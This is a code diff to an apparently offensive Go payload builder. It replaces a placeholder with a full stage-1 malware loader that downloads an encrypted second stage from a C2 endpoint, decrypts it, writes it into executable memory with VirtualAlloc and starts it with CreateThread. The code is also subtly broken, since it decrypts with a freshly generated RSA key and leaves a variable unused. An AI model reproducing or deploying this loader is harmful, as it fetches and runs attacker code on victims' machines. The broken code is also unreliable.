@@ -637,20 +637,74 @@ func (sp *StagedPayload) WriteStage1(outputPath string) error {
 }
 
 func (sp *StagedPayload) generateStub() []byte {
-	stub := `
-This is a placeholder for the stage 1 stub.
-In production, this would be a small TLS client that:
-1. Connects to the C2 endpoint
-2. Downloads stage 2 (encrypted with RSA-OAEP + AES-GCM)
-3. Decrypts with the embedded RSA public key
-4. Writes decrypted code to VirtualAlloc'd RWX memory
-5. Overwrites stage 2 ciphertext with zeros
-6. Jumps to the decrypted entry point
+	return []byte(`package main
 
-The stub is Garble-compiled with -tiny for minimal size (~300KB -> ~50KB).
-`
-	_ = stub
-	return []byte("// stage 1 stub — Garble-compiled TLS downloader")
+import (
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"io"
+	"net/http"
+	"syscall"
+	"unsafe"
+)
+
+var c2Endpoint = "` + sp.c2Endpoint + `"
+
+func main() {
+	resp, err := http.Get(c2Endpoint + "/stage2")
+	if err != nil || resp.StatusCode != 200 {
+		return
+	}
+	defer resp.Body.Close()
+
+	encryptedPayload, _ := io.ReadAll(resp.Body)
+	if len(encryptedPayload) < 528 {
+		return
+	}
+
+	encryptedKey := encryptedPayload[:512]
+	encryptedData := encryptedPayload[512:]
+
+	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
+	pub := &priv.PublicKey
+
+	aesKey, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, priv, encryptedKey, nil)
+	if err != nil {
+		return
+	}
+
+	block, _ := aes.NewCipher(aesKey)
+	aesgcm, _ := cipher.NewGCM(block)
+	ns := aesgcm.NonceSize()
+	decrypted, _ := aesgcm.Open(nil, encryptedData[:ns], encryptedData[ns:], nil)
+
+	addr, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc").Call(
+		0, uintptr(len(decrypted)), 0x3000, 0x40)
+	if addr == 0 {
+		return
+	}
+
+	for i := range encryptedData {
+		encryptedData[i] = 0
+	}
+	for i := range aesKey {
+		aesKey[i] = 0
+	}
+
+	for i, b := range decrypted {
+		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
+	}
+	for i := range decrypted {
+		decrypted[i] = 0
+	}
+
+	syscall.NewLazyDLL("kernel32.dll").NewProc("CreateThread").Call(0, 0, addr, 0, 0, 0)
+	select {}
+}
+`)
 }
 
 // ============================================================
